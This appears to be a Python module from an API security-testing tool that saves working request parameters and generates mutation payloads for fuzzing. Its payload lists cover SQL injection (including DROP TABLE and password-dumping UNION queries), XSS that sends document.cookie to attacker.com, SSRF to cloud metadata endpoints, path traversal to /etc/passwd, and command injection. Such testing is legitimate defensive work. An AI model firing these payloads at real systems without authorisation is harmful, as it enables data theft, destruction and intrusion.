"""
Enhanced Parameter Generator with Database Storage and Mutation
"""

import json
import logging
import requests
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timezone
from app import db
from app.models import Endpoint, ParameterSet, ParameterMutation
from app.utils.placeholder import ParameterGenerator
from app.config import Config

logger = logging.getLogger(__name__)

class EnhancedParameterGenerator:
    """Enhanced parameter generator with database storage and mutation capabilities"""
    
    def __init__(self, openai_api_key: str = None):
        self.base_generator = ParameterGenerator(openai_api_key)
        self.session = requests.Session()
        
        # Setup authorization headers
        self._setup_headers()
    
    def _setup_headers(self):
        """Setup authorization headers for API requests"""
        try:
            import json
            additional_headers = json.loads(Config.API_HEADERS)
            self.session.headers.update(additional_headers)
        except:
            self.session.headers.update({
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            })
        
        if Config.API_AUTHORIZATION_HEADER:
            auth_type = Config.API_AUTHORIZATION_TYPE
            auth_value = Config.API_AUTHORIZATION_HEADER
            
            if auth_type.lower() == 'bearer':
                self.session.headers['Authorization'] = f'Bearer {auth_value}'
            elif auth_type.lower() == 'basic':
                self.session.headers['Authorization'] = f'Basic {auth_value}'
            else:
                self.session.headers['Authorization'] = f'{auth_type} {auth_value}'
    
    def generate_and_validate_parameters(self, endpoint: Endpoint, use_ai: bool = True) -> Dict:
        """
        Generate parameters and validate them against the actual API
        
        Args:
            endpoint: Endpoint to generate parameters for
            use_ai: Whether to use AI for parameter generation
            
        Returns:
            Dictionary with parameters and validation results
        """
        logger.info(f"🔍 Generating and validating parameters for {endpoint.path}")
        
        # First, try to get existing valid parameter sets
        existing_params = self._get_existing_parameter_sets(endpoint.id)
        if existing_params:
            logger.info(f"📋 Found {len(existing_params)} existing parameter sets")
            return self._use_existing_parameters(endpoint, existing_params)
        
        # Generate new parameters
        endpoint_data = {
            'path': endpoint.path,
            'method': endpoint.method,
            'summary': endpoint.summary,
            'description': endpoint.description,
            'parameters_schema': endpoint.parameters_schema,
            'request_body_schema': endpoint.request_body_schema
        }
        
        param_values = self.base_generator.generate_parameter_values(endpoint_data, use_ai)
        
        # Validate parameters against the API
        validation_result = self._validate_parameters(endpoint, param_values)
        
        if validation_result['success']:
            # Save successful parameter set
            self._save_parameter_set(endpoint, param_values, validation_result)
            logger.info(f"✅ Parameters validated and saved successfully")
        else:
            logger.warning(f"⚠️  Parameter validation failed: {validation_result['error']}")
        
        return {
            'parameters': param_values,
            'validation': validation_result
        }
    
    def _get_existing_parameter_sets(self, endpoint_id: str) -> List[ParameterSet]:
        """Get existing valid parameter sets for an endpoint"""
        return ParameterSet.query.filter_by(
            endpoint_id=endpoint_id,
            is_valid=True
        ).order_by(ParameterSet.success_count.desc()).all()
    
    def _use_existing_parameters(self, endpoint: Endpoint, parameter_sets: List[ParameterSet]) -> Dict:
        """Use existing parameter sets and create mutations"""
        # Use the most successful parameter set
        best_param_set = parameter_sets[0]
        
        # Update success count
        best_param_set.success_count += 1
        best_param_set.last_used = datetime.now(timezone.utc)
        db.session.commit()
        
        # Create mutations for security testing
        mutations = self._create_parameter_mutations(best_param_set)
        
        return {
            'parameters': best_param_set.parameters,
            'request_body': best_param_set.request_body,
            'validation': {'success': True, 'status_code': best_param_set.response_status},
            'mutations': mutations,
            'source': 'existing_parameter_set'
        }
    
    def _validate_parameters(self, endpoint: Endpoint, param_values: Dict) -> Dict:
        """Validate parameters by making a test request to the API"""
        try:
            # Build the target URL using service's API URL
            if endpoint.service and endpoint.service.api_url:
                # Remove /v3/api-docs from the service URL to get the actual API base URL
                service_url = endpoint.service.api_url.rstrip('/')
                if service_url.endswith('/v3/api-docs'):
                    base_url = service_url[:-12]  # Remove '/v3/api-docs'
                else:
                    base_url = service_url
            else:
                base_url = Config.API_BASE_URL.rstrip('/')
            
            path = endpoint.path
            
            # Replace path parameters
            for param_name, param_value in param_values.items():
                if param_name in path:
                    path = path.replace(f'{{{param_name}}}', str(param_value))
            
            # Add query parameters
            query_params = {}
            for param_name, param_value in param_values.items():
                if param_name not in path and param_name != 'request_body':
                    query_params[param_name] = param_value
            
            url = f"{base_url}{path}"
            
            # Prepare request
            method = endpoint.method.lower()
            request_body = param_values.get('request_body')
            
            logger.info(f"🔍 Validating parameters with {method.upper()} request to {url}")
            
            # Make the request
            if method == 'get':
                response = self.session.get(url, params=query_params, timeout=30)
            elif method == 'post':
                response = self.session.post(url, params=query_params, json=request_body, timeout=30)
            elif method == 'put':
                response = self.session.put(url, params=query_params, json=request_body, timeout=30)
            elif method == 'delete':
                response = self.session.delete(url, params=query_params, timeout=30)
            else:
                response = self.session.request(method, url, params=query_params, json=request_body, timeout=30)
            
            # Consider 2xx and 3xx responses as successful
            success = 200 <= response.status_code < 400
            
            return {
                'success': success,
                'status_code': response.status_code,
                'response_body': response.text[:1000],  # Truncate large responses
                'response_headers': dict(response.headers),
                'error': None if success else f"HTTP {response.status_code}"
            }
            
        except Exception as e:
            logger.error(f"❌ Parameter validation failed: {e}")
            return {
                'success': False,
                'status_code': None,
                'response_body': None,
                'response_headers': None,
                'error': str(e)
            }
    
    def _save_parameter_set(self, endpoint: Endpoint, param_values: Dict, validation_result: Dict):
        """Save successful parameter set to database"""
        try:
            # Create parameter set name
            name = f"Auto-generated {endpoint.method} {endpoint.path}"
            if endpoint.summary:
                name = f"{endpoint.summary} - {name}"
            
            # Extract request body
            request_body = param_values.pop('request_body', None)
            
            # Create parameter set
            param_set = ParameterSet(
                endpoint_id=endpoint.id,
                name=name,
                description=f"Auto-generated parameter set for {endpoint.path}",
                parameters=param_values,
                request_body=request_body,
                response_status=validation_result['status_code'],
                response_body=validation_result['response_body'],
                response_headers=validation_result['response_headers']
            )
            
            db.session.add(param_set)
            db.session.commit()
            
            logger.info(f"💾 Saved parameter set: {param_set.id}")
            
        except Exception as e:
            logger.error(f"❌ Failed to save parameter set: {e}")
            db.session.rollback()
    
    def _create_parameter_mutations(self, parameter_set: ParameterSet) -> List[Dict]:
        """Create parameter mutations for security testing"""
        mutations = []
        
        # Create mutations for each parameter
        for param_name, param_value in parameter_set.parameters.items():
            param_mutations = self._mutate_parameter(param_name, param_value)
            mutations.extend(param_mutations)
        
        # Create mutations for request body
        if parameter_set.request_body:
            body_mutations = self._mutate_request_body(parameter_set.request_body)
            mutations.extend(body_mutations)
        
        return mutations
    
    def _mutate_parameter(self, param_name: str, param_value: Any) -> List[Dict]:
        """Create mutations for a single parameter"""
        mutations = []
        
        # SQL Injection mutations (Enhanced)
        sql_payloads = [
            "'", 
            "1' OR '1'='1", 
            "1; DROP TABLE users; --", 
            "1' UNION SELECT * FROM users --",
            "1' UNION SELECT username,password FROM users --",
            "1' AND 1=1 --",
            "1' AND 1=2 --",
            "1' ORDER BY 1 --",
            "1' ORDER BY 2 --",
            "1' GROUP BY 1 --",
            "1' HAVING 1=1 --"
        ]
        for payload in sql_payloads:
            mutations.append({
                'type': 'sql_injection',
                'parameter': param_name,
                'original_value': str(param_value),
                'mutated_value': payload,
                'description': f"SQL injection test for {param_name}",
                'severity': 'high'
            })
        
        # XSS mutations (Enhanced)
        xss_payloads = [
            "<script>alert('xss')</script>", 
            "javascript:alert('xss')", 
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "javascript:fetch('http://attacker.com?cookie='+document.cookie)",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "';alert('xss');//",
            "\"><script>alert('xss')</script>"
        ]
        for payload in xss_payloads:
            mutations.append({
                'type': 'xss',
                'parameter': param_name,
                'original_value': str(param_value),
                'mutated_value': payload,
                'description': f"XSS test for {param_name}",
                'severity': 'medium'
            })
        
        # SSRF mutations (New)
        ssrf_payloads = [
            "http://localhost:8080",
            "http://127.0.0.1:8080",
            "http://0.0.0.0:8080",
            "http://attacker.com",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://169.254.169.254/latest/user-data/"
        ]
        for payload in ssrf_payloads:
            mutations.append({
                'type': 'ssrf',
                'parameter': param_name,
                'original_value': str(param_value),
                'mutated_value': payload,
                'description': f"SSRF test for {param_name}",
                'severity': 'high'
            })
        
        # Path traversal mutations (New)
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        for payload in path_traversal_payloads:
            mutations.append({
                'type': 'path_traversal',
                'parameter': param_name,
                'original_value': str(param_value),
                'mutated_value': payload,
                'description': f"Path traversal test for {param_name}",
                'severity': 'high'
            })
        
        # Command injection mutations (New)
        command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| netstat -an",
            "& ping -c 1 attacker.com"
        ]
        for payload in command_injection_payloads:
            mutations.append({
                'type': 'command_injection',
                'parameter': param_name,
                'original_value': str(param_value),
                'mutated_value': payload,
                'description': f"Command injection test for {param_name}",
                'severity': 'critical'
            })
        
        # Boundary value mutations (Enhanced)
        if isinstance(param_value, (int, float)):
            mutations.extend([
                {
                    'type': 'boundary',
                    'parameter': param_name,
                    'original_value': str(param_value),
                    'mutated_value': '0',
                    'description': f"Boundary test (zero) for {param_name}",
                    'severity': 'low'
                },
                {
                    'type': 'boundary',
                    'parameter': param_name,
                    'original_value': str(param_value),
                    'mutated_value': '-1',
                    'description': f"Boundary test (negative) for {param_name}",
                    'severity': 'low'
                },
                {
                    'type': 'boundary',
                    'parameter': param_name,
                    'original_value': str(param_value),
                    'mutated_value': '999999999',
                    'description': f"Boundary test (large number) for {param_name}",
                    'severity': 'low'
                },
                {
                    'type': 'boundary',
                    'parameter': param_name,
                    'original_value': str(param_value),
                    'mutated_value': str(float('inf')),
                    'description': f"Boundary test (infinity) for {param_name}",
                    'severity': 'low'
                }
            ])
        
        # Type confusion mutations (New)
        type_confusion_payloads = [
            "null",
            "undefined",
            "true",
            "false",
            "[]",
            "{}",
            "[1,2,3]",
            '{"key":"value"}'
        ]
        for payload in type_confusion_payloads:
            mutations.append({
                'type': 'type_confusion',
                'parameter': param_name,
                'original_value': str(param_value),
                'mutated_value': payload,
                'description': f"Type confusion test for {param_name}",
                'severity': 'medium'
            })
        
        return mutations
    
    def _mutate_request_body(self, request_body: Dict) -> List[Dict]:
        """Create mutations for request body"""
        mutations = []
        
        # Create deep copy for mutations
        import copy
        body_copy = copy.deepcopy(request_body)
        
        # Mutate each field in the request body
        for field_name, field_value in request_body.items():
            field_mutations = self._mutate_parameter(field_name, field_value)
            for mutation in field_mutations:
                mutation['parameter'] = f"request_body.{field_name}"
                mutations.append(mutation)
        
        return mutations
    
    def get_parameter_sets_for_endpoint(self, endpoint_id: str) -> List[Dict]:
        """Get all parameter sets for an endpoint"""
        param_sets = ParameterSet.query.filter_by(endpoint_id=endpoint_id).all()
        
        return [{
            'id': ps.id,
            'name': ps.name,
            'description': ps.description,
            'parameters': ps.parameters,
            'request_body': ps.request_body,
            'success_count': ps.success_count,
            'last_used': ps.last_used.isoformat() if ps.last_used else None,
            'is_valid': ps.is_valid
        } for ps in param_sets]
    
    def create_manual_parameter_set(self, endpoint_id: str, name: str, parameters: Dict, 
                                  request_body: Dict = None, description: str = None) -> str:
        """Create a manual parameter set"""
        try:
            param_set = ParameterSet(
                endpoint_id=endpoint_id,
                name=name,
                description=description or f"Manual parameter set: {name}",
                parameters=parameters,
                request_body=request_body
            )
            
            db.session.add(param_set)
            db.session.commit()
            
            logger.info(f"💾 Created manual parameter set: {param_set.id}")
            return param_set.id
            
        except Exception as e:
            logger.error(f"❌ Failed to create manual parameter set: {e}")
            db.session.rollback()
            return None
    
    def generate_intelligent_parameters(self, endpoint: Endpoint) -> Dict:
        """Generate intelligent parameters based on parameter names and types"""
        intelligent_params = {}
        
        # Extract parameter information from schema
        if endpoint.parameters_schema:
            try:
                schema = json.loads(endpoint.parameters_schema) if isinstance(endpoint.parameters_schema, str) else endpoint.parameters_schema
                
                for param_name, param_info in schema.items():
                    param_type = param_info.get('type', 'string')
                    param_format = param_info.get('format', '')
                    
                    # Generate intelligent values based on parameter name and type
                    intelligent_value = self._generate_intelligent_value(param_name, param_type, param_format)
                    intelligent_params[param_name] = intelligent_value
                    
            except Exception as e:
                logger.warning(f"⚠️  Failed to parse parameter schema: {e}")
        
        # Generate intelligent values for path parameters
        path = endpoint.path
        import re
        path_params = re.findall(r'\{([^}]+)\}', path)
        
        for param in path_params:
            if param not in intelligent_params:
                intelligent_value = self._generate_intelligent_value(param, 'string', '')
                intelligent_params[param] = intelligent_value
        
        return intelligent_params
    
    def _generate_intelligent_value(self, param_name: str, param_type: str, param_format: str) -> Any:
        """Generate intelligent value based on parameter name and type"""
        param_name_lower = param_name.lower()
        
        # ID parameters
        if 'id' in param_name_lower:
            if param_type == 'integer':
                return 12345
            else:
                return '12345'
        
        # Email parameters
        if 'email' in param_name_lower:
            return 'test@example.com'
        
        # URL parameters
        if 'url' in param_name_lower or 'link' in param_name_lower:
            return 'https://example.com'
        
        # Date parameters
        if 'date' in param_name_lower:
            if param_format == 'date':
                return '2024-01-01'
            elif param_format == 'date-time':
                return '2024-01-01T00:00:00Z'
            else:
                return '2024-01-01'
        
        # Boolean parameters
        if param_type == 'boolean':
            return True
        
        # Integer parameters
        if param_type == 'integer':
            if 'limit' in param_name_lower:
                return 10
            elif 'offset' in param_name_lower:
                return 0
            elif 'page' in param_name_lower:
                return 1
            else:
                return 123
        
        # Number parameters
        if param_type == 'number':
            return 123.45
        
        # Array parameters
        if param_type == 'array':
            return ['item1', 'item2', 'item3']
        
        # Object parameters
        if param_type == 'object':
            return {'key': 'value'}
        
        # String parameters with specific formats
        if param_format == 'uuid':
            return '550e8400-e29b-41d4-a716-446655440000'
        elif param_format == 'email':
            return 'test@example.com'
        elif param_format == 'uri':
            return 'https://example.com'
        elif param_format == 'ipv4':
            return '192.168.1.1'
        elif param_format == 'ipv6':
            return '2001:db8::1'
        
        # Default string values based on parameter name
        if 'name' in param_name_lower:
            return 'Test Name'
        elif 'title' in param_name_lower:
            return 'Test Title'
        elif 'description' in param_name_lower:
            return 'Test Description'
        elif 'content' in param_name_lower:
            return 'Test Content'
        elif 'message' in param_name_lower:
            return 'Test Message'
        elif 'token' in param_name_lower:
            return 'test_token_12345'
        elif 'key' in param_name_lower:
            return 'test_key_12345'
        elif 'secret' in param_name_lower:
            return 'test_secret_12345'
        elif 'password' in param_name_lower:
            return 'test_password_123'
        elif 'username' in param_name_lower:
            return 'testuser'
        elif 'user' in param_name_lower:
            return 'testuser'
        elif 'file' in param_name_lower:
            return 'test.txt'
        elif 'path' in param_name_lower:
            return '/test/path'
        elif 'query' in param_name_lower:
            return 'test query'
        elif 'search' in param_name_lower:
            return 'test search'
        elif 'filter' in param_name_lower:
            return 'test filter'
        elif 'sort' in param_name_lower:
            return 'name'
        elif 'order' in param_name_lower:
            return 'asc'
        elif 'status' in param_name_lower:
            return 'active'
        elif 'state' in param_name_lower:
            return 'enabled'
        elif 'enabled' in param_name_lower:
            return True
        elif 'disabled' in param_name_lower:
            return False
        elif 'active' in param_name_lower:
            return True
        elif 'inactive' in param_name_lower:
            return False
        elif 'public' in param_name_lower:
            return True
        elif 'private' in param_name_lower:
            return False
        elif 'visible' in param_name_lower:
            return True
        elif 'hidden' in param_name_lower:
            return False
        else:
            return 'test_value'
